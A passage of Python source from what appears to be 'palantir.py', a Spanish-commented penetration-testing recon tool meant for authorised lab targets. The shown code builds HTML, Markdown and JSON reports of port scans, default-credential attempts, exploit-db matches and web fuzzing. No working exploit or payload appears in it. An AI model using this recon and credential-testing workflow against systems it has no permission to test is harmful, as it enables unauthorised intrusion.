        mark = '<span class="ok">✓</span>' if st["ok"] else '<span class="no">·</span>'
        out.append(f'<div class="cmd">{mark} $ {_h(st["cmd"])}{_copy_btn(st["cmd"])}</div>')
        if st.get("note"):                            # modo educativo: el porqué de cada comando
            out.append(f'<div class="why">↳ por qué: {_h(st["note"])}</div>')
        if st["output"]:
            out.append(f"<pre>{_h(st['output'])}</pre>")
    return "".join(out)


def _html_steps(steps, collapsible=False):
    """Como _html_steps_raw, pero si collapsible=True y NINGÚN paso tuvo éxito (típico de
    sesión nula/credenciales por defecto que no abrieron nada), el detalle completo se pliega
    bajo un <details> con un resumen de una línea en vez de ocupar pantalla con N intentos
    fallidos uno a uno — nada se borra, solo deja de estorbar por defecto. Con --resume
    reutilizando el footprint de un run anterior (ver run_one): el usuario quería justo esto,
    'que no se ponga lo que no ha devuelto nada'."""
    if not collapsible or not steps or any(st["ok"] for st in steps):
        return _html_steps_raw(steps)
    n = len(steps)
    return (f'<details class="attempts"><summary>{n} intento{"s" if n != 1 else ""} '
            f'probado{"s" if n != 1 else ""}, ninguno con éxito — ver comandos</summary>'
            f'<div class="body">{_html_steps_raw(steps)}</div></details>')


_CRED_TITLE_RX = re.compile(r"^Credenciales (?:por defecto|aportadas) — (.+)$")


def _group_footprints_by_protocol(footprints):
    """Agrupa los footprints por protocolo REAL, quitando los prefijos "creds-"/"reuse-" que
    distinguen footprint anónimo / credenciales por defecto (Fase 5c) / credenciales aportadas
    (Fase 5d) del MISMO protocolo — hasta ahora el informe los mostraba en 2-3 secciones
    separadas (p. ej. "SMB / RPC", "Credenciales por defecto — SMB" y, peor, TODOS los
    protocolos de la Fase 5d mezclados en un único "Credenciales aportadas (reutilización)"),
    fragmentando lo que en la práctica es "todo sobre SMB". Devuelve una lista de grupos
    {"title", "ports", "anon": dict|None, "default": dict|None, "provided": dict|None}, en
    el orden de la 1ª aparición de cada protocolo (estable: no reordena el informe)."""
    groups, order = {}, []
    for fpr in footprints:
        proto = fpr["proto"]
        if proto.startswith("creds-"):
            base, kind = proto[len("creds-"):], "default"
        elif proto.startswith("reuse-"):
            base, kind = proto[len("reuse-"):], "provided"
        else:
            base, kind = proto, "anon"
        # El footprint anónimo clasifica MSRPC como "msrpc" (classify()), pero las credenciales
        # (por defecto/aportadas) lo prueban vía nxc como "wmi" (_NXC_PROTO_OF) — único caso
        # donde el nombre de protocolo difiere entre fases; sin normalizar, MSRPC/WMI saldría
        # partido en dos grupos en vez de uno.
        base = _NXC_PROTO_OF.get(base, base)
        if base not in groups:
            groups[base] = {"anon": None, "default": None, "provided": None}
            order.append(base)
        groups[base][kind] = fpr
    out = []
    for base in order:
        g = groups[base]
        title = None
        if g["anon"]:
            title = g["anon"]["title"]
        else:
            for kind in ("default", "provided"):
                if g[kind]:
                    m = _CRED_TITLE_RX.match(g[kind]["title"])
                    title = m.group(1) if m else g[kind]["title"]
                    break
        ports = sorted({p for kind in ("anon", "default", "provided") if g[kind] for p in g[kind]["ports"]})
        out.append({"title": title or base.upper(), "ports": ports, **g})
    return out


def _all_findings(services, host, footprints, vulns):
    """Hallazgos agregados: footprints + highlight() (NSE destacado) + resumen de
    exploits de searchsploit por producto — el MISMO conjunto para HTML, Markdown y
    findings.json (antes cada informe se quedaba con un subconjunto distinto: el JSON
    solo tenía footprints, y Markdown se perdía el resumen de exploits que sí sale en HTML)."""
    all_findings = []
    for fpr in footprints:
        all_findings += fpr["findings"]
    for label, line in highlight(services, host):
        all_findings.append(("media", f"{label}: {line}"))
    for v in (vulns or []):
        if v["exploits"]:
            worst = min(v["exploits"], key=lambda e: EXPLOIT_SEV_ORDER.get(e["sev"], 9))["sev"]
            sev = {"critica": "alta", "alta": "alta", "media": "media", "baja": "info"}[worst]
            ids = ", ".join(f"EDB-{e['edb']}" for e in v["exploits"][:4])
            all_findings.append((sev, f"{v['product']} {v['version']}: {len(v['exploits'])} exploits "
                                 f"en exploit-db (peor: {worst}; {ids}…) — verificar"))
    # Dedup conservando orden: el MISMO hallazgo puede venir de varias fases (p. ej. anónimo y
    # con credencial), y repetirlo solo añade ruido al informe.
    seen, uniq = set(), []
    for f in all_findings:
        t = tuple(f)   # en --resume los findings se recargan de findings.json como listas (no hashables)
        if t not in seen:
            seen.add(t)
            uniq.append(t)
    return uniq


def build_html(ip, services, host, footprints, vulns, domains, web_hits, vhosts, extra_domain, when,
               preliminary=False, no_fuzz=False):
    all_findings = _all_findings(services, host, footprints, vulns)
    n_alta = sum(1 for s, _ in all_findings if s == "alta")

    # Desglose por severidad (tira de pastillas de color bajo el título de Hallazgos): de un
    # vistazo cuántas críticas/altas/medias/info hay, sin tener que contar la lista a mano.
    sev_counts = {}
    for s, _ in all_findings:
        sev_counts[s] = sev_counts.get(s, 0) + 1
    sev_bar_inner = "".join(
        f'<span class="badge {k}">{sev_counts[k]} {lbl}</span>'
        for k, lbl in (("critica", "críticas"), ("alta", "altas"), ("media", "medias"),
                       ("info", "info"), ("baja", "bajas")) if sev_counts.get(k))
    sev_bar_html = f'<div class="sevbar">{sev_bar_inner}</div>' if sev_bar_inner else ""

    # Accionables (crítica/alta) arriba y SIEMPRE visibles; el resto (media/info/baja: resúmenes de
    # exploits por versión, destacados NSE, notas) se pliega en «Contexto» para no ahogar lo que hay
    # que mirar de verdad — justo lo que se pidió: claro y sin ruido.
    actionable = [f for f in all_findings if f[0] in ("critica", "alta")]
    context = [f for f in all_findings if f[0] not in ("critica", "alta")]
    context_html = ""
    if context:
        context_html = ('<details class="attempts" id="sec-context"><summary>Contexto e informativo '
                        f'({len(context)}) — exploits por versión (ruido alto), destacados NSE, notas</summary>'
                        f'<div class="body">{_html_findings_block(context)}</div></details>')

    n_crit = sum(1 for s, _ in all_findings if s == "critica")
    n_protos = len(_group_footprints_by_protocol(footprints))
    cards = [
        ("Puertos abiertos", len(services)),
        ("Protocolos", n_protos),
        ("Críticas", n_crit),
        ("Altas", n_alta),
        ("Hallazgos", len(all_findings)),
    ]
    cards_html = "".join(
        f'<div class="card"><div class="n">{n}</div><div class="l">{_h(l)}</div></div>'
        for l, n in cards)

    rows = []
    for p in sorted(services, key=lambda x: (x["proto"], x["port"])):
        ver = version_str(p)
        unk = not p["name"] or p["name"] in ("unknown", "tcpwrapped") or not ver
        cls = "svc-unk" if unk else "svc-open"
        rows.append(
            f'<tr><td class="p">{p["port"]}/{p["proto"]}</td>'
            f'<td class="{cls}">{_h(p["name"] or "?")}</td>'
            f'<td>{_h(ver)}</td><td class="miss">{_h(p.get("banner",""))}</td></tr>')
    ports_tbl = ('<table><tr><th>Puerto</th><th>Servicio</th><th>Versión</th><th>Banner</th></tr>'
                 + "".join(rows) + "</table>")

    fp_html, fp_toc = [], []
    for i, g in enumerate(_group_footprints_by_protocol(footprints)):
        pstr = ",".join(map(str, g["ports"]))
        sub_blocks, nf = [], 0
        for kind, label in (("anon", None), ("default", "Credenciales por defecto"),
                            ("provided", "Credenciales aportadas")):
            fpr = g[kind]
            if not fpr:
                continue
            nf += len(fpr["findings"])
            # Lo que más ruido da cuando no encuentra nada (sesión nula/creds por defecto que
            # no abrieron ninguna puerta) se pliega — lo aportado SIEMPRE se muestra entero.
            inner = _html_findings_block(fpr["findings"])
            inner += _html_steps(fpr["steps"], collapsible=(kind != "provided"))
            if fpr["next"]:
                inner += "<h3>Siguientes pasos</h3><ul class='next'>" + \
                         "".join(f"<li><code>{_h(x)}</code>{_copy_btn(x)}</li>" for x in fpr["next"]) + "</ul>"
            if fpr["missing"]:
                inner += f'<p class="miss">Herramientas no instaladas: {_h(", ".join(fpr["missing"]))}</p>'
            heading = f'<h4 class="subhead">{_h(label)}</h4>' if label else ""
            sub_blocks.append(heading + inner)
        pill = f'{nf} hallazgo{"s" if nf != 1 else ""}' if nf else "sin hallazgos"
        sec_id = f"sec-fp-{i}"
        fp_toc.append((sec_id, g["title"], nf))
        fp_html.append(
            f'<details class="proto" id="{sec_id}"{" open" if nf else ""}>'
            f'<summary>{_h(g["title"])} <span class="tag">{pstr}</span>'
            f'<span class="pill">{pill}</span></summary>'
            f'<div class="body">{"".join(sub_blocks)}</div></details>')

    host_html = ""
    if host:
        items = "".join(f"<h3>{_h(sid)}</h3><pre>{_h(txt)}</pre>" for sid, txt in host.items() if txt)
        host_html = ('<details class="proto" id="sec-host"><summary>Scripts NSE de host '
                     f'<span class="pill">{len(host)}</span></summary>'
                     f'<div class="body">{items}</div></details>')

    web_html = ""
    if web_hits or vhosts:
        parts = []
        # Claves mixtas: int = puerto (Fase 6, vhost por defecto); str "fqdn:puerto" = Fase 7b
        # (directorios de un vhost concreto). Se ordenan por str para no mezclar int+str.
        for key, hits in sorted(web_hits.items(), key=lambda kv: str(kv[0])):
            if not hits:
                continue
            titulo = f"Puerto {key} — directorios" if isinstance(key, int) else f"vhost {_h(key)} — directorios"
            rws = "".join(
                f'<tr><td class="p">{_h(h["status"])}</td><td>/{_h(h["path"])}</td>'
                f'<td class="miss">{_h(h.get("length",""))} b</td></tr>'
                for h in sorted(hits, key=lambda x: -(x["length"] or 0))[:80])
            parts.append(f"<h3>{titulo}</h3>"
                         f"<table><tr><th>Código</th><th>Ruta</th><th>Tamaño</th></tr>{rws}</table>")
        for host_name, vh in vhosts:
            rws = "".join(f'<tr><td class="p">{_h(v["status"])}</td><td>{_h(v["host"])}</td>'
                          f'<td class="miss">{_h(v.get("length",""))} b</td></tr>' for v in vh)
            if rws:
                parts.append(f"<h3>vhosts ({_h(host_name)})</h3>"
                             f"<table><tr><th>Código</th><th>Host</th><th>Tamaño</th></tr>{rws}</table>")
        if parts:
            web_html = ('<details class="proto" id="sec-web"><summary>Fuzzing web / vhosts</summary>'
                        f'<div class="body">{"".join(parts)}</div></details>')

    vuln_html = ""
    rows_v = [v for v in (vulns or []) if v["exploits"]]
    if rows_v:
        rows_v.sort(key=lambda v: min(EXPLOIT_SEV_ORDER.get(e["sev"], 9) for e in v["exploits"]))
        blocks = []
        for v in rows_v:
            pstr = ",".join(map(str, v["ports"]))
            exps = sorted(v["exploits"], key=lambda e: EXPLOIT_SEV_ORDER.get(e["sev"], 9))
            trs = "".join(
                f'<tr><td><span class="badge {e["sev"]}">{e["sev"].upper()}</span></td>'
                f'<td class="p">EDB-{_h(e["edb"])}</td><td>{_h(e["title"])}</td>'
                f'<td class="miss">{_h(e["platform"])}</td></tr>'
                for e in exps[:8])
            more = (f'<p class="miss">… y {len(exps) - 8} más (ruido por coincidencia de versión; '
                    f'<code>searchsploit -x EDB-ID</code> para ver cada uno)</p>'
                    if len(exps) > 8 else "")
            blocks.append(
                f'<h3>{_h(v["product"])} {_h(v["version"])} '
                f'<span class="miss">({pstr} · término: {_h(v["term"])})</span></h3>'
                f'<table><tr><th>Criticidad</th><th>EDB-ID</th><th>Título</th><th>Plataforma</th></tr>'
                f'{trs}</table>{more}')
        n = sum(len(v["exploits"]) for v in rows_v)
        vuln_html = (
            '<details class="proto" id="sec-vulns"><summary>Exploits conocidos (searchsploit) '
            f'<span class="pill">{n}</span></summary><div class="body">'
            '<p class="miss">Coincidencias por versión en exploit-db (offline). La criticidad es una '
            '<b>estimación por tipo/título</b> (remote→crítica, privesc→alta, DoS→baja…), <b>no un CVSS oficial</b>. '
            'El match por versión da falsos positivos — verifica cada uno con '
            '<code>searchsploit -x EDB-ID</code> y adáptalo antes de usarlo.</p>'
            f'{"".join(blocks)}</div></details>')

    hostbar = ""
    names = sorted(set(domains) | ({extra_domain} if extra_domain else set()))
    if names:
        hostbar = f'<div class="hostbar">/etc/hosts → <code>{_h(ip)} {_h(" ".join(names))}</code></div>'
    # Hostname/dominio en la cabecera (no solo en la línea /etc/hosts de abajo): el más
    # específico conocido (extra_domain, o el primer hostname propio descubierto) junto al
    # dominio AD base, si los hay — para no tener que bajar a /etc/hosts solo para saber en
    # qué dominio estamos.
    hostname_disp = extra_domain or next((d for d in names if base_domain(d) != d), None)
    ad_domain_disp = next((d for d in names if base_domain(d) == d), None)
    title_extra = f" ({_h(hostname_disp)})" if hostname_disp and hostname_disp != ad_domain_disp else ""
    sub_domain = f" · dominio {_h(ad_domain_disp)}" if ad_domain_disp else ""

    # Informe preliminar: se escribe antes de que footprint/creds (y, si toca, el fuzzing)
    # hayan terminado. Un meta-refresh recarga la página sola hasta que el informe final
    # (sin refresh) la sustituye. El TEXTO del aviso varía según si el fuzzing va a correr
    # de verdad: con --no-fuzz nunca se llega a lanzar, así que decir "el fuzzing sigue en
    # marcha" es FALSO — lo que de verdad falta en ese caso es footprint/credenciales/
    # exploits, que es justo lo que ya se está viendo correr en la terminal (bug real: con
    # --no-fuzz, la página se quedaba anunciando una fase que nunca iba a ejecutarse).
    refresh_meta = '<meta http-equiv="refresh" content="60">' if preliminary else ""
    if preliminary and no_fuzz:
        prelim_banner = (
            '<div class="prelim"><span class="spin">◴</span><div>'
            '<b>Informe preliminar</b> — escaneo ya está aquí; footprinting, credenciales y '
            'exploits siguen en marcha (sin fuzzing: <b>--no-fuzz</b>). '
            'Esta página se recarga sola cada 60&nbsp;s y se sustituirá por el informe '
            'definitivo al terminar.'
            '</div></div>')
    elif preliminary:
        prelim_banner = (
            '<div class="prelim"><span class="spin">◴</span><div>'
            '<b>Informe preliminar</b> — escaneo, footprinting y exploits ya están aquí; '
            'el <b>fuzzing web/vhost</b> (la fase más larga) sigue en marcha. '
            'Esta página se recarga sola cada 60&nbsp;s y se sustituirá por el informe '
            'definitivo (con rutas y vhosts) al terminar.'
            '</div></div>')
    else:
        prelim_banner = ""

    wins = quick_wins(footprints, vulns)
    qw_html = ""
    if wins:
        items = []
        for w in wins[:12]:
            cmds = "".join(f'<div class="cmd">$ {_h(c)}{_copy_btn(c)}</div>' for c in w["cmds"][:2])
            tip_html = f'<div class="tip">💡 {_h(w["tip"])}</div>' if w.get("tip") else ""
            items.append(f'<div class="f"><span class="badge {w["sev"]}">{w["sev"].upper()}</span>'
                         f'<div style="flex:1"><div>{_h(w["title"])}</div>{cmds}{tip_html}</div></div>')
        qw_html = (f'<h3 style="margin-top:0">★ Quick wins ({len(wins)})</h3>'
                   '<div class="findings">' + "".join(items) + '</div>')

    # Índice (#9): enlaces de salto a cada sección. Orden visual: puertos → protocolos
    # footprinted → exploits → fuzzing → scripts de host. El JS abre el <details> destino
    # (esté colapsado o no) y hace scroll suave hasta él.
    toc = [("sec-ports", "Puertos", len(services))] + fp_toc
    if vuln_html:
        toc.append(("sec-vulns", "Exploits (EDB)", sum(len(v["exploits"]) for v in rows_v)))
    if web_html:
        toc.append(("sec-web", "Fuzzing web/vhosts", None))
    if host_html:
        toc.append(("sec-host", "Scripts NSE host", len(host)))
    toc_links = "".join(
        f'<a href="#{sid}">{_h(label)}'
        + (f'<span class="n">{cnt}</span>' if cnt else "")
        + "</a>"
        for sid, label, cnt in toc)
    nav_html = f'<nav class="toc"><span class="lbl">Ir a:</span>{toc_links}</nav>' if len(toc) > 1 else ""

    return f"""<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">{refresh_meta}
<title>palantir · {_h(ip)}{" · preliminar" if preliminary else ""}</title><style>{HTML_CSS}</style></head>
<body>
<header>
  <h1>palantir <span>· recon de {_h(ip)}{title_extra}</span></h1>
  <div class="sub">generado {_h(when)}{(" · preliminar (recon en curso)" if no_fuzz else " · preliminar (fuzzing en curso)") if preliminary else ""}{sub_domain}</div>
</header>
<div class="wrap">
  <div class="cards">{cards_html}</div>
  {hostbar}
  {prelim_banner}
  {qw_html}
  <h3{' style="margin-top:0"' if not qw_html else ''}>★ Hallazgos accionables ({len(actionable)})</h3>
  {sev_bar_html}
  {_html_findings_block(actionable) or '<p class="miss">Sin hallazgos críticos ni altos — mira «Contexto» más abajo.</p>'}
  {context_html}
  {nav_html}
  <div class="toolbar">
    <input id="filter" placeholder="filtrar protocolos / texto…">
    <button class="btn" id="expand">Expandir todo</button>
    <button class="btn" id="collapse">Colapsar todo</button>
  </div>
  <details open id="sec-ports"><summary>Puertos y servicios <span class="pill">{len(services)}</span></summary>
    <div class="body">{ports_tbl}</div></details>
  {"".join(fp_html)}
  {vuln_html}
  {web_html}
  {host_html}
  <footer>palantir.py · recon guiado por Nmap · uso solo en objetivos autorizados (labs HTB/CPTS)</footer>
</div>
<script>{HTML_JS}</script>
</body></html>"""


def _md_esc(s):
    return str(s).replace("|", "\\|").replace("\n", " ")


def build_markdown(ip, services, host, footprints, vulns, domains, web_hits, vhosts, extra_domain, when,
                   preliminary=False, no_fuzz=False):
    """Informe en Markdown (report.md) para pegar directamente en las notas/writeups."""
    names = sorted(set(domains) | ({extra_domain} if extra_domain else set()))
    hostname_disp = extra_domain or next((d for d in names if base_domain(d) != d), None)
    ad_domain_disp = next((d for d in names if base_domain(d) == d), None)
    title_extra = f" ({hostname_disp})" if hostname_disp and hostname_disp != ad_domain_disp else ""
    sub_domain = f" · dominio {ad_domain_disp}" if ad_domain_disp else ""
    # Mismo matiz que build_html: con --no-fuzz el fuzzing NUNCA se lanza, así que el aviso
    # "preliminar" no puede decir que está "en marcha" — lo que de verdad falta es footprint/
    # credenciales/exploits.
    prelim_tag = (" · preliminar (recon en curso)" if no_fuzz else " · preliminar (fuzzing en curso)") if preliminary else ""
    L = [f"# palantir — recon de {ip}{title_extra}",
         f"_generado {when}{prelim_tag}{sub_domain}_", ""]
    if preliminary and no_fuzz:
        L += ["> ⏳ **Informe preliminar**: escaneo listo; footprinting, credenciales y exploits "
              "siguen en marcha (sin fuzzing: --no-fuzz). Se regenerará al terminar.", ""]
    elif preliminary:
        L += ["> ⏳ **Informe preliminar**: escaneo/footprint/exploits listos; "
              "el fuzzing web/vhost sigue en marcha. Se regenerará al terminar.", ""]
    if names:
        L += [f"`/etc/hosts`: `{ip} {' '.join(names)}`", ""]

    wins = quick_wins(footprints, vulns)
    if wins:
        L += [f"## ★ Quick wins ({len(wins)})", ""]
        for w in wins[:15]:
            L.append(f"- **[{w['sev']}]** {w['title']}")
            for c in w["cmds"][:2]:
                L.append(f"  - `{c}`")
            if w.get("tip"):
                L.append(f"  - 💡 {w['tip']}")
        L.append("")

    all_findings = _all_findings(services, host, footprints, vulns)
    if all_findings:
        _sc = {}
        for s, _ in all_findings:
            _sc[s] = _sc.get(s, 0) + 1
        _summary = " · ".join(f"{_sc[k]} {lbl}" for k, lbl in
                              (("critica", "críticas"), ("alta", "altas"), ("media", "medias"),
                               ("info", "info"), ("baja", "bajas")) if _sc.get(k))
        L += [f"## Hallazgos ({len(all_findings)})", ""]
        if _summary:
            L += [f"_{_summary}_", ""]
        L += ["| Sev | Hallazgo |", "|---|---|"]
        for s, t in sorted(all_findings, key=lambda f: SEV_ORDER.get(f[0], 9)):
            L.append(f"| {s} | {_md_esc(t)} |")
        L.append("")

    L += [f"## Puertos y servicios ({len(services)})", "", "| Puerto | Servicio | Versión | Banner |", "|---|---|---|---|"]
    for p in sorted(services, key=lambda x: (x["proto"], x["port"])):
        L.append(f"| {p['port']}/{p['proto']} | {_md_esc(p['name'] or '?')} | {_md_esc(version_str(p))} | {_md_esc(p.get('banner', ''))} |")
    L.append("")

    # Agrupado por protocolo REAL (ver _group_footprints_by_protocol): footprint anónimo +
    # credenciales por defecto + aportadas del MISMO protocolo bajo un solo "## Título", con
    # sub-encabezados "###" solo si hay más de un sub-bloque con algo que mostrar (si solo
    # hay uno, un sub-encabezado sería ruido redundante con el propio "## Título").
    for g in _group_footprints_by_protocol(footprints):
        active = []
        for kind, label in (("anon", None), ("default", "Credenciales por defecto"),
                            ("provided", "Credenciales aportadas")):
            fpr = g[kind]
            if fpr and (fpr["findings"] or fpr["next"] or fpr["missing"]):
                active.append((label, fpr))
        if not active:
            continue                              # en MD no se pintan los steps: sin findings/next/missing no hay nada que mostrar (no dejar un "## Título" colgando)
        pstr = ",".join(map(str, g["ports"]))
        L += [f"## {g['title']}" + (f" ({pstr})" if pstr else ""), ""]
        multi = len(active) > 1
        for label, fpr in active:
            if multi and label:
                L.append(f"### {label}")
            for s, t in sorted(fpr["findings"], key=lambda f: SEV_ORDER.get(f[0], 9)):
                L.append(f"- **[{s}]** {t}")
            if fpr["next"]:
                L += ["", "**Siguientes pasos:**"]
                for n in fpr["next"]:
                    L.append(f"- `{n}`")
            if fpr["missing"]:
                L += ["", f"_Sin instalar: {', '.join(fpr['missing'])}_"]
            L.append("")

    rows_v = [v for v in (vulns or []) if v["exploits"]]
    if rows_v:
        rows_v.sort(key=lambda v: min(EXPLOIT_SEV_ORDER.get(e["sev"], 9) for e in v["exploits"]))
        L += ["## Exploits conocidos (searchsploit)", "",
              "_Coincidencia por versión (offline, ruidosa); verifica cada EDB-ID con `searchsploit -x EDB-ID`._", ""]
        for v in rows_v:
            L.append(f"### {v['product']} {v['version']} ({','.join(map(str, v['ports']))})")
            for e in sorted(v["exploits"], key=lambda e: EXPLOIT_SEV_ORDER.get(e["sev"], 9))[:15]:
                L.append(f"- [{e['sev']}] EDB-{e['edb']} — {_md_esc(e['title'])} [{e['platform']}]")
            L.append("")

    if any(web_hits.values()) or vhosts:
        L += ["## Web", ""]
        for key, hits in sorted(web_hits.items(), key=lambda kv: str(kv[0])):
            if not hits:
                continue
            L.append(f"### Puerto {key} — directorios" if isinstance(key, int)
                     else f"### vhost {key} — directorios")
            for h in sorted(hits, key=lambda x: -(x["length"] or 0))[:40]:
                L.append(f"- `{h['status']}` /{h['path']} ({h['length']} b)")
            L.append("")
        for hn, vh in vhosts:
            if not vh:
                continue
            L.append(f"### vhosts ({hn})")
            for v in vh:
                L.append(f"- `{v['status']}` {v['host']} ({v.get('length', '')} b)")
            L.append("")

    L += ["---", "_palantir.py · uso solo en objetivos autorizados (labs HTB/CPTS)_"]
    return "\n".join(L)


def write_reports(base, ip, services, host, footprints, vulns, domains, web_hits, vhosts, extra_domain,
                  preliminary=False, quiet=False, phases_done=None, name="", no_fuzz=False):
    """Vuelca report.html / report.md / findings.json con el estado actual.
    `preliminary`: marca el informe como pre-fuzzing (banner + auto-refresh).
    `no_fuzz`: --no-fuzz del operador — el aviso de "preliminar" NO puede decir que el
    fuzzing "sigue en marcha" si --no-fuzz hace que nunca se vaya a lanzar (ver build_html/
    build_markdown); sin esto, un run con --no-fuzz se quedaba anunciando una fase que
    jamás iba a correr mientras footprint/credenciales (lo que de verdad falta) terminaban.
    `quiet`: no imprime el 'good()' por fichero (para los refrescos durante el fuzzing,
    que si no inundarían la pantalla); los errores sí se siguen avisando.
    `phases_done`: fases estáticas (footprint/searchsploit/creds_default) que corrieron
    en ESTE run — se guarda en el JSON para que un futuro --resume sepa qué puede
    reutilizar sin repetir (ver run_one() y _load_prev_findings()).
    `name`: hostname dado por CLI (--vhost/--targets), si lo hay — se persiste en el JSON
    para que write_index pueda mostrarlo sin depender de la lista de objetivos de ESTE
    run (ver _scan_outdir_targets)."""
    tag = " preliminar (pre-fuzzing)" if preliminary else ""
    when = datetime.now().strftime("%Y-%m-%d %H:%M")
    html_path = base / "report.html"
    try:
        html_path.write_text(
            build_html(ip, services, host, footprints, vulns, domains, web_hits, vhosts, extra_domain, when,
                       preliminary=preliminary, no_fuzz=no_fuzz),
            encoding="utf-8")
        if not quiet:
            good(f"Informe HTML{tag}: {html_path}")
    except Exception as e:   # no solo OSError: un fallo al RENDERIZAR (TypeError/KeyError…) NO debe
        err(f"no pude generar el HTML{tag}: {e}")   # abortar write_reports y llevarse el MD y el JSON
        traceback.print_exc()
    md_path = base / "report.md"
    try:
        md_path.write_text(
            build_markdown(ip, services, host, footprints, vulns, domains, web_hits, vhosts, extra_domain, when,
                           preliminary=preliminary, no_fuzz=no_fuzz),
            encoding="utf-8")
        if not quiet:
            good(f"Informe Markdown{tag}: {md_path}")
    except Exception as e:
        err(f"no pude generar el Markdown{tag}: {e}")
        traceback.print_exc()
    # findings.json es la FUENTE DE VERDAD de --resume y del índice: la construcción del data
    # (incluye _all_findings, que agrega) va DENTRO del try, no solo el write — así un fallo al
    # agregar o serializar se avisa pero no deja el JSON sin escribir ni tumba el resto.
    try:
        domains_out = sorted(set(domains) | ({extra_domain} if extra_domain else set()))
        data = {
            "target": ip, "name": name or "", "generated": when, "preliminary": preliminary,
            "ports": [{k: p[k] for k in ("port", "proto", "name", "product", "version",
                                         "extrainfo", "banner", "scripts")} for p in services],
            "host_scripts": host,
            "footprints": footprints,
            "vulns": vulns or [],
            "findings": [{"sev": s, "text": t} for s, t in _all_findings(services, host, footprints, vulns)],
            "domains": domains_out, "web": {str(k): v for k, v in web_hits.items()}, "vhosts": vhosts,
            "phases_done": phases_done or [],
        }
        (base / "findings.json").write_text(json.dumps(data, indent=2, ensure_ascii=False),
                                            encoding="utf-8")
        if not quiet:
            good(f"JSON: {base / 'findings.json'}")
    except Exception as e:
        err(f"no pude generar el JSON: {e}")
        traceback.print_exc()


def _ports_signature(ports):
    """(puerto, proto) de cada entrada, ordenado — para comparar 'mismos puertos/servicios
    que el run anterior' sin que el orden o el resto de campos (banner, scripts…) importen."""
    return sorted((p["port"], p["proto"]) for p in ports)


def _resume_reuse_ok(resume, prev, nmap_fresh_scan, services):
    """¿Puede --resume reutilizar footprint/searchsploit/credenciales por defecto del run
    anterior en vez de repetirlos (ver run_one)? Solo si --resume está activo, hay un
    findings.json anterior, NINGÚN nmap tuvo que re-escanear de verdad (_TLS.nmap_fresh_scan)
    y los puertos/servicios son EXACTAMENTE los mismos que entonces — si algo de eso falla,
    reutilizar sería mostrar datos potencialmente obsoletos como si fueran de este run."""
    if not resume or prev is None or nmap_fresh_scan:
        return False
    return _ports_signature(services) == _ports_signature(prev.get("ports", []))


def _load_prev_findings(base):
    """El findings.json que dejó el run anterior de este objetivo (para --resume: reutilizar
    fases ya hechas en vez de repetirlas, ver run_one()). None si no hay, está corrupto o no
    se puede leer — entonces se hace todo de cero, como siempre (fallback seguro)."""
    fj = base / "findings.json"
    if not fj.is_file():
        return None
    try:
        return json.loads(fj.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None


def _scan_outdir_targets(outdir):
    """Carpetas <outdir>/<folder>/ que corresponden a un objetivo ya escaneado (tienen
    findings.json, o error.log si petó antes del primer informe) — base de write_index
    para que el índice salga de lo que HAY en outdir, no de la lista de objetivos de un
    run concreto. Cualquier otra carpeta ajena en outdir se ignora."""
    base = Path(outdir)
    if not base.is_dir():
        return []
    rows = []
    for p in sorted(base.iterdir()):
        if not p.is_dir():
            continue
        fj, errlog = p / "findings.json", p / "error.log"
        if not fj.is_file() and not errlog.is_file():
            continue
        data = None
        if fj.is_file():
            try:
                data = json.loads(fj.read_text(encoding="utf-8"))
            except (OSError, ValueError):
                data = None
        rows.append((p.name, data, errlog.is_file()))
    return rows


def write_index(outdir):
    """<outdir>/index.html con TODO lo que hay en outdir — no solo los objetivos del run
    que lo dispara. Se llama tras CUALQUIER escaneo (uno o varios objetivos): lee del
    disco (_scan_outdir_targets) el findings.json que write_reports ya dejó en cada
    carpeta, de este run o de cualquier run anterior, así que el índice es acumulativo
    entre invocaciones de palantir — el caso normal es un objetivo por sesión, en días
    distintos, y aun así queda uno solo listándolos todos en vez de machacarse cada vez.
    No reescanea ni recalcula nada. Si a un objetivo no le llegó a salir findings.json
    (petó antes del primer informe), la fila lo dice en vez de romper el resto del índice."""
    rows, tot_ports, tot_sev, failed = [], 0, {}, 0
    for folder, data, has_errlog in _scan_outdir_targets(outdir):
        if data is None:
            failed += 1
            rows.append((folder, folder, None, {}, "", has_errlog))
            continue
        # Nombre a mostrar: el que se dio por CLI tiene prioridad (explícito, persistido
        # en el JSON por write_reports); si no se dio ninguno, el/los hostname(s) que el
        # propio escaneo DESCUBRIÓ (SMB/LDAP/DNS — el mismo campo "domains" que ya se
        # ofrece para /etc/hosts en el report de ese objetivo) — mejor que mostrar solo
        # la IP cuando ya se sabe que es, p. ej., "dc01.nexura.htb". No cambia la carpeta
        # en disco, solo el texto de esta fila.
        ip = data.get("target", folder)
        name = data.get("name") or ""
        discovered = data.get("domains") or []
        label = f"{ip} ({name})" if name else (f"{ip} ({', '.join(discovered)})" if discovered else ip)
        n_ports = len(data.get("ports", []))
        sevs = {}
        for f in data.get("findings", []):
            sevs[f.get("sev", "info")] = sevs.get(f.get("sev", "info"), 0) + 1
        tot_ports += n_ports
        for k, v in sevs.items():
            tot_sev[k] = tot_sev.get(k, 0) + v
        rows.append((label, folder, n_ports, sevs, data.get("generated", ""), False))

    n_alta_total = tot_sev.get("critica", 0) + tot_sev.get("alta", 0)
    cards = [("Objetivos", len(rows)), ("Puertos (total)", tot_ports),
             ("Hallazgos (total)", sum(tot_sev.values())), ("Alta/crítica (total)", n_alta_total),
             ("Sin informe", failed)]
    cards_html = "".join(f'<div class="card"><div class="n">{n}</div><div class="l">{_h(l)}</div></div>'
                         for l, n in cards)

    trs = []
    for label, folder, n_ports, sevs, when, has_errlog in sorted(
            rows, key=lambda r: (r[2] is None, -sum(r[3].values()))):
        if n_ports is None:
            nota = "ver error.log" if has_errlog else "sin informe (petó antes del primer report.html)"
            trs.append(f'<tr><td>{_h(label)}</td><td class="miss" colspan="3">{_h(nota)}</td></tr>')
            continue
        sev_txt = ", ".join(f"{v} {k}" for k, v in sorted(sevs.items(), key=lambda kv: SEV_ORDER.get(kv[0], 9))) \
            or "sin hallazgos"
        trs.append(f'<tr><td><a href="{html.escape(folder)}/report.html">{_h(label)}</a></td>'
                   f'<td class="p">{n_ports}</td><td>{_h(sev_txt)}</td><td class="miss">{_h(when)}</td></tr>')
    tbl = ('<table><tr><th>Objetivo</th><th>Puertos</th><th>Hallazgos</th><th>Generado</th></tr>'
          + "".join(trs) + "</table>")

    out = f"""<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
